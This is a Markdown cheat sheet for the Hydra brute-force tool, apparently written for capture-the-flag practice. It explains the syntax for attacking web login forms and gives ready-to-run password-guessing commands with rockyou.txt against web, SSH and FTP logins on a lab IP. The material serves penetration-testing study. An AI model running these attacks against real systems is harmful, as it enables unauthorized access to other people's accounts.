Markdown

````
# Hydra Cheatsheet

### 1. HTTP Form Module Selection
Choose the correct module based on how the web application handles authentication data:

| Module | HTTP Method | Visual Indicator |
| :--- | :--- | :--- |
| **`http-post-form`** | `POST` (Most common) | Data is hidden in the request body (visible in Burp Suite). |
| **`http-get-form`** | `GET` | Credentials appear directly in the URL query string after submission. |
| **`http-head`** | Basic / Digest | Browser prompts you with a native login pop-up box (`401 Unauthorized`). |

---

### 2. Form Syntax Breakdown

```bash
hydra -l <user> -P <wordlist> <target_ip> http-post-form "<path>:<payload>:<condition>"
````

The double-quoted string requires exactly **three components separated by colons (`:`)**:

Plaintext

```
    "/login.php : username=^USER^&password=^PASS^&sub=Login : Invalid username or password"
         │                        │                                       │
         ▼                        ▼                                       ▼
   1. Page Path           2. Request Payload                     3. Failure Condition
```

- **1. Page Path:** The relative URI target of the form submission (found in the HTML `<form action="...">` attribute).
    
- **2. Request Payload:** The raw body data sent to the server. Replace input values with the global placeolders `^USER^` and `^PASS^`. Join all input elements (including submit buttons) using ampersands (`&`).
    
- **3. Failure Condition:** The unique string text that appears on the page _only_ when authentication fails. If Hydra sees this string, it assumes the guess was wrong.
    

### 3. Practical Core Examples

#### Standard Web Login (POST)

Bash

```
hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt 10.113.169.254 http-post-form "/login.php:username=^USER^&password=^PASS^&sub=Login:Invalid username or password" -V
```

#### Success-Based Conditioning

If the failure page is dynamic or unreliable, configure Hydra to look for a **Success Condition** instead by prepending `S=` to the third component (e.g., searching for a 302 redirect location or dashboard element):

Bash

```
hydra -l admin -P wordlist.txt 10.113.169.254 http-post-form "/login.php:username=^USER^&password=^PASS^:S=Location: index.php" -v
```

#### Common Infrastructure Services

Network protocols do not require custom form payload strings because Hydra builds the handshake tracking natively:

- **SSH:**
    
    Bash
    
    ```
    hydra -l root -P /usr/share/wordlists/rockyou.txt 10.113.169.254 ssh -t 4
    ```
    
- **FTP:**
    
    Bash
    
    ```
    hydra -L users.txt -P passwords.txt 10.113.169.254 ftp -V
    ```
    

### 4. Critical Control Flags

- **`-l <string>`** / **`-L <file>`**: Use a single targeted username vs. loading a list of multiple users.
    
- **`-p <string>`** / **`-P <file>`**: Use a single targeted password vs. loading a dictionary file.
    
- **`-t <tasks>`**: Set connection concurrency (default is 16). Drop this lower (e.g., `-t 4`) if the web server begins throwing `503 Service Unavailable` or dropping packets under load.
    
- **`-V`**: High verbosity mode. Displays every single password attempt in real-time. Use this to verify that your string variables are expanding and formatting correctly.